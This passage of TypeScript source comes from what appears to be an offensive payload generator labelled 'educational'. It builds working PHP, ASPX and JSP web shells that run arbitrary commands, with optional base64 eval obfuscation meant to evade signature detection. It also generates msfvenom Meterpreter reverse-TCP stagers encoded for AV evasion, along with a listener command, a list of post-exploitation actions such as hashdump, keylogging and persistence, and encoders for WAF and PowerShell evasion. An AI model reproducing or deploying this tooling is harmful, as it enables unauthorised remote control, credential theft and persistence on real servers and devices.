echo "<html><head><title>AegisAI360 Educational Shell</title></head><body>";
echo "<h2>AegisAI360 - Educational Web Shell</h2>";
echo "<p style='color:red;font-weight:bold'>FOR AUTHORIZED TESTING ONLY</p>";
echo "<p>Server: " . php_uname() . "</p>";
echo "<p>User: " . get_current_user() . " | PHP: " . phpversion() . "</p>";

${commandExec ? `
echo '<h3>Execute Command</h3>';
echo '<form method="POST">';
echo '<input type="text" name="cmd" size="80" placeholder="Enter command..." />';
${useAuth ? `echo '<input type="hidden" name="auth" value="' . htmlspecialchars($_POST['auth'] ?? $_GET['auth'] ?? '') . '" />';` : ""}
echo '<input type="submit" value="Execute" />';
echo '</form>';
` : ""}

${cmdBlock}
${fileManagerBlock}
${uploadBlock}

echo "</body></html>";
?>`;

      if (obfuscate) {
        const b64 = Buffer.from(body).toString("base64");
        payload = `<?php
${EDUCATIONAL_DISCLAIMER.split("\n").map(l => "// " + l.replace(/^# ?/, "")).join("\n")}
// Obfuscated payload — decoded and executed at runtime
// Original code is base64-encoded to evade basic signature detection
eval(base64_decode('${b64}'));
?>`;
        notes = "Obfuscated PHP web shell. The code is base64-encoded to bypass basic signature detection. De-obfuscate with: echo BASE64 | base64 -d";
      } else {
        payload = body;
        notes = "PHP web shell with " + [commandExec && "command execution", fileManager && "file manager", upload && "file upload", useAuth && "authentication"].filter(Boolean).join(", ") + ". Deploy to a PHP-enabled web server.";
      }
      break;
    }

    case "aspx":
      payload = `${EDUCATIONAL_DISCLAIMER.split("\n").map(l => "<%-- " + l.replace(/^# ?/, "") + " --%>").join("\n")}
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<html>
<head><title>AegisAI360 Educational Shell</title></head>
<body>
<h2>AegisAI360 - Educational ASPX Shell</h2>
<p style="color:red;font-weight:bold">FOR AUTHORIZED TESTING ONLY</p>
<p>Server: <%= Environment.MachineName %> | OS: <%= Environment.OSVersion %> | .NET: <%= Environment.Version %></p>
<p>User: <%= Environment.UserName %> | Domain: <%= Environment.UserDomainName %></p>

${useAuth ? `<%
    string authPass = Request.Form["auth"] ?? Request.QueryString["auth"] ?? "";
    if (authPass != "${password}") {
        Response.StatusCode = 404;
        Response.End();
        return;
    }
%>` : ""}

<h3>Execute Command</h3>
<form method="POST">
    <input type="text" name="cmd" size="80" placeholder="Enter command..." />
    ${useAuth ? `<input type="hidden" name="auth" value="<%= Request.Form["auth"] ?? Request.QueryString["auth"] ?? "" %>" />` : ""}
    <input type="submit" value="Execute" />
</form>

<%
    string cmd = Request.Form["cmd"] ?? Request.QueryString["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        // Execute the command using cmd.exe /c
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        Process p = Process.Start(psi);
        string output = p.StandardOutput.ReadToEnd();
        string error = p.StandardError.ReadToEnd();
        p.WaitForExit();

        Response.Write("<h3>Output:</h3><pre>" + Server.HtmlEncode(output) + "</pre>");
        if (!string.IsNullOrEmpty(error)) {
            Response.Write("<h3>Errors:</h3><pre style='color:red'>" + Server.HtmlEncode(error) + "</pre>");
        }
    }
%>
</body>
</html>`;
      notes = "ASPX web shell for IIS/.NET servers. Supports command execution. Deploy to an IIS web application directory.";
      break;

    case "jsp":
      payload = `${EDUCATIONAL_DISCLAIMER.split("\n").map(l => "<%-- " + l.replace(/^# ?/, "") + " --%>").join("\n")}
<%@ page import="java.io.*,java.util.*" %>
<html>
<head><title>AegisAI360 Educational Shell</title></head>
<body>
<h2>AegisAI360 - Educational JSP Shell</h2>
<p style="color:red;font-weight:bold">FOR AUTHORIZED TESTING ONLY</p>
<p>Server: <%= System.getProperty("os.name") %> <%= System.getProperty("os.version") %></p>
<p>User: <%= System.getProperty("user.name") %> | Java: <%= System.getProperty("java.version") %></p>

<%
${useAuth ? `
    String authPass = request.getParameter("auth");
    if (authPass == null || !authPass.equals("${password}")) {
        response.setStatus(404);
        return;
    }
` : ""}
%>

<h3>Execute Command</h3>
<form method="POST">
    <input type="text" name="cmd" size="80" placeholder="Enter command..." />
    ${useAuth ? `<input type="hidden" name="auth" value="<%= request.getParameter("auth") != null ? request.getParameter("auth") : "" %>" />` : ""}
    <input type="submit" value="Execute" />
</form>

<%
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.isEmpty()) {
        // Determine OS and use appropriate shell
        String[] command;
        String os = System.getProperty("os.name").toLowerCase();
        if (os.contains("win")) {
            command = new String[]{"cmd.exe", "/c", cmd};
        } else {
            command = new String[]{"/bin/sh", "-c", cmd};
        }

        // Execute the command
        Process p = Runtime.getRuntime().exec(command);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        BufferedReader ebr = new BufferedReader(new InputStreamReader(p.getErrorStream()));

        out.println("<h3>Output:</h3><pre>");
        String line;
        while ((line = br.readLine()) != null) {
            // HTML-encode the output to prevent XSS
            out.println(line.replace("<", "&lt;").replace(">", "&gt;"));
        }
        out.println("</pre>");

        // Display error output if any
        StringBuilder errors = new StringBuilder();
        while ((line = ebr.readLine()) != null) {
            errors.append(line).append("\\n");
        }
        if (errors.length() > 0) {
            out.println("<h3>Errors:</h3><pre style='color:red'>" +
                errors.toString().replace("<", "&lt;").replace(">", "&gt;") + "</pre>");
        }
        p.waitFor();
    }
%>
</body>
</html>`;
      notes = "JSP web shell for Tomcat/Java application servers. Supports command execution. Deploy to a JSP-enabled web server.";
      break;
  }

  return {
    payload,
    language: lang,
    type: "web_shell",
    size: Buffer.byteLength(payload, "utf-8"),
    notes,
  };
}

export function generateMeterpreterStager(
  platform: string,
  arch: string,
  options: MeterpreterOptions
): { payload: string; command: string; platform: string; arch: string; size: number; notes: string } {
  const plat = platform.toLowerCase();
  const architecture = arch.toLowerCase();

  if (!METERPRETER_PLATFORMS.includes(plat)) {
    throw new Error(`Unsupported platform: ${platform}. Supported: ${METERPRETER_PLATFORMS.join(", ")}`);
  }
  if (!METERPRETER_ARCHS.includes(architecture)) {
    throw new Error(`Unsupported architecture: ${arch}. Supported: ${METERPRETER_ARCHS.join(", ")}`);
  }

  const lhost = options.lhost;
  const lport = options.lport;
  const encoder = options.encoder || "x86/shikata_ga_nai";
  const iterations = options.iterations || 3;
  const nops = options.nops || 16;

  let payloadPath = "";
  let format = options.format || "";
  let extension = "";
  let handlerNotes = "";

  switch (plat) {
    case "windows":
      if (architecture === "x64") {
        payloadPath = "windows/x64/meterpreter/reverse_tcp";
        format = format || "exe";
        extension = ".exe";
      } else {
        payloadPath = "windows/meterpreter/reverse_tcp";
        format = format || "exe";
        extension = ".exe";
      }
      handlerNotes = "Transfer to Windows target and execute. May need to bypass AV/EDR.";
      break;
    case "linux":
      if (architecture === "x64") {
        payloadPath = "linux/x64/meterpreter/reverse_tcp";
        format = format || "elf";
        extension = ".elf";
      } else {
        payloadPath = "linux/x86/meterpreter/reverse_tcp";
        format = format || "elf";
        extension = ".elf";
      }
      handlerNotes = "Transfer to Linux target, chmod +x, and execute.";
      break;
    case "android":
      payloadPath = "android/meterpreter/reverse_tcp";
      format = format || "raw";
      extension = ".apk";
      handlerNotes = "Install APK on Android device. Requires 'Unknown sources' enabled or ADB sideloading.";
      break;
    case "osx":
      if (architecture === "x64") {
        payloadPath = "osx/x64/meterpreter/reverse_tcp";
        format = format || "macho";
        extension = ".macho";
      } else {
        payloadPath = "osx/x86/meterpreter/reverse_tcp";
        format = format || "macho";
        extension = ".macho";
      }
      handlerNotes = "Transfer to macOS target, chmod +x, and execute. May need to bypass Gatekeeper.";
      break;
  }

  if (options.format) {
    format = options.format;
  }

  const outputFile = `payload_${plat}_${architecture}${extension}`;

  const command = [
    `msfvenom`,
    `-p ${payloadPath}`,
    `LHOST=${lhost}`,
    `LPORT=${lport}`,
    `-e ${encoder}`,
    `-i ${iterations}`,
    `--nops ${nops}`,
    `-f ${format}`,
    `-o ${outputFile}`,
  ].join(" \\\n  ");

  const handlerCommand = `
msfconsole -q -x "
  use exploit/multi/handler;
  set PAYLOAD ${payloadPath};
  set LHOST ${lhost};
  set LPORT ${lport};
  set ExitOnSession false;
  exploit -j
"`;

  const payload = `${EDUCATIONAL_DISCLAIMER}

# ============================================================
# METERPRETER STAGER GENERATION COMMAND
# Platform: ${plat} | Architecture: ${architecture}
# Payload: ${payloadPath}
# ============================================================

# Step 1: Generate the payload using msfvenom
# This creates a ${format.toUpperCase()} file containing the Meterpreter stager
# The stager connects back to your listener and downloads the full payload

${command}

# ============================================================
# COMMAND BREAKDOWN:
# -p ${payloadPath}
#    Specifies the payload type (staged Meterpreter reverse TCP)
#    "staged" means a small stager connects back and downloads
#    the full Meterpreter DLL/shared object
#
# LHOST=${lhost}
#    The IP address of your listener (attacker machine)
#
# LPORT=${lport}
#    The port your listener is running on
#
# -e ${encoder}
#    Encoder to use for AV evasion
#    ${encoder} is a polymorphic XOR additive feedback encoder
#
# -i ${iterations}
#    Number of encoding iterations (more = harder to detect
#    but larger file size)
#
# --nops ${nops}
#    NOP sled size (helps with memory alignment)
#
# -f ${format}
#    Output format (${format})
#
# -o ${outputFile}
#    Output filename
# ============================================================

# Step 2: Start the Metasploit handler to catch the connection
# Run this on your attacker machine BEFORE executing the payload
${handlerCommand}

# ============================================================
# POST-EXPLOITATION COMMANDS (after getting a session):
# sysinfo          - Get system information
# getuid           - Get current user ID
# hashdump         - Dump password hashes
# screenshot       - Capture screenshot
# keyscan_start    - Start keylogger
# upload/download  - Transfer files
# shell            - Drop to system shell
# migrate          - Migrate to another process
# persistence      - Install persistence mechanism
# ============================================================`;

  return {
    payload,
    command,
    platform: plat,
    arch: architecture,
    size: Buffer.byteLength(payload, "utf-8"),
    notes: `${handlerNotes} Payload: ${payloadPath}, Format: ${format}, Encoder: ${encoder} (${iterations} iterations). Requires Metasploit Framework installed on the attacker machine.`,
  };
}

export function encodePayload(
  payload: string,
  encoding: string
): { encoded: string; encoding: string; originalSize: number; encodedSize: number; notes: string } {
  const enc = encoding.toLowerCase();
  let encoded = "";
  let notes = "";

  switch (enc) {
    case "base64":
      encoded = Buffer.from(payload).toString("base64");
      notes = "Base64 encoding. Decode with: echo 'ENCODED' | base64 -d (Linux) or [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ENCODED')) (PowerShell)";
      break;

    case "url":
      encoded = encodeURIComponent(payload);
      notes = "URL encoding. All special characters are percent-encoded. Decode with: python3 -c \"import urllib.parse; print(urllib.parse.unquote('ENCODED'))\"";
      break;

    case "hex":
      encoded = Buffer.from(payload)
        .toString("hex")
        .match(/.{1,2}/g)!
        .map((b) => "\\x" + b)
        .join("");
      notes = "Hex encoding with \\x prefix. Decode with: echo -e 'ENCODED' (Bash) or python3 -c \"print(bytes.fromhex('HEX').decode())\"";
      break;

    case "unicode":
      encoded = Array.from(payload)
        .map((c) => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0"))
        .join("");
      notes = "Unicode escape encoding. Each character is represented as \\uXXXX. Common in JavaScript/JSON contexts.";
      break;

    case "double":
      encoded = encodeURIComponent(encodeURIComponent(payload));
      notes = "Double URL encoding. Useful for bypassing WAFs that decode input once. Requires two rounds of URL decoding to recover original.";
      break;

    case "powershell": {
      const utf16le = Buffer.from(payload, "utf-8");
      const utf16Buf = Buffer.alloc(payload.length * 2);
      for (let i = 0; i < payload.length; i++) {
        utf16Buf.writeUInt16LE(payload.charCodeAt(i), i * 2);
      }
      const b64 = utf16Buf.toString("base64");
      encoded = `powershell -EncodedCommand ${b64}`;
      notes = "PowerShell encoded command. The payload is converted to UTF-16LE then Base64 encoded. Execute directly with: powershell -EncodedCommand ENCODED";
      break;
    }

    default:
      throw new Error(`Unsupported encoding: ${encoding}. Supported: base64, url, hex, unicode, double, powershell`);
  }

  return {
    encoded,
    encoding: enc,
    originalSize: Buffer.byteLength(payload, "utf-8"),
    encodedSize: Buffer.byteLength(encoded, "utf-8"),
    notes,
  };
}
